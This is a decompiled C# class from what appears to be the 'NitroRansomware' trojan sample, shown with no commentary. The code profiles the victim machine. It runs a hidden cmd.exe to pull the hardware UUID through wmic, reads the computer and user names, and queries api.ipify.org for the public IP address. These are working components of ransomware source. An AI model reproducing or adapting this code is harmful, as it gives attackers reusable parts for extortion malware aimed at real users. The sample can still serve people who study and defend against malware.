// Decompiled with JetBrains decompiler
// Type: NitroRansomware.User
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 884F7023-5B8E-423B-BD61-5C84B42B2DFE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-92190c9789485a0d96bced7040080f0ae35c02898c3d31a65d50ecd659b80f09.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;

namespace NitroRansomware
{
  internal class User
  {
    private static Logs logging = new Logs("DEBUG", 0);

    public static string GetIdentifier()
    {
      string empty = string.Empty;
      try
      {
        using (User.Cmd cmd = new User.Cmd("cmd.exe"))
          empty = cmd.ExecuteCommand("wmic csproduct get uuid").Split('\n')[6];
      }
      catch (Exception ex)
      {
        User.logging.Error(ex.Message);
      }
      return empty;
    }

    public static List<string> GetDetails()
    {
      List<string> details = new List<string>();
      string environmentVariable1 = Environment.GetEnvironmentVariable("COMPUTERNAME");
      string environmentVariable2 = Environment.GetEnvironmentVariable("UserName");
      details.Add(environmentVariable1);
      details.Add(environmentVariable2);
      return details;
    }

    public static string GetIP()
    {
      string ip = string.Empty;
      try
      {
        using (HttpClient httpClient = new HttpClient())
          ip = httpClient.GetAsync("https://api.ipify.org").Result.Content.ReadAsStringAsync().Result;
      }
      catch (Exception ex)
      {
        User.logging.Error(ex.Message);
      }
      return ip;
    }

    private class Cmd : IDisposable
    {
      private Process cmdProcess;
      private StreamWriter sw;
      private AutoResetEvent outputWaitHandle;
      private string cmdOutput;

      public Cmd(string cmdPath)
      {
        this.cmdProcess = new Process();
        this.outputWaitHandle = new AutoResetEvent(false);
        this.cmdOutput = string.Empty;
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        processStartInfo.FileName = cmdPath;
        processStartInfo.UseShellExecute = false;
        processStartInfo.RedirectStandardOutput = true;
        processStartInfo.RedirectStandardInput = true;
        processStartInfo.CreateNoWindow = true;
        this.cmdProcess.OutputDataReceived += new DataReceivedEventHandler(this.CmdProcess_OutputDataReceived);
        this.cmdProcess.StartInfo = processStartInfo;
        this.cmdProcess.Start();
        this.sw = this.cmdProcess.StandardInput;
        this.cmdProcess.BeginOutputReadLine();
      }

      public void Dispose()
      {
        this.cmdProcess.Close();
        this.cmdProcess.Dispose();
        this.sw.Close();
        this.sw.Dispose();
      }

      public string ExecuteCommand(string command)
      {
        this.cmdOutput = string.Empty;
        this.sw.WriteLine(command);
        this.sw.WriteLine("echo end");
        this.outputWaitHandle.WaitOne();
        return this.cmdOutput;
      }

      private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
      {
        if (e.Data == null || e.Data == "end")
          this.outputWaitHandle.Set();
        else
          this.cmdOutput = this.cmdOutput + e.Data + Environment.NewLine;
      }
    }
  }
}
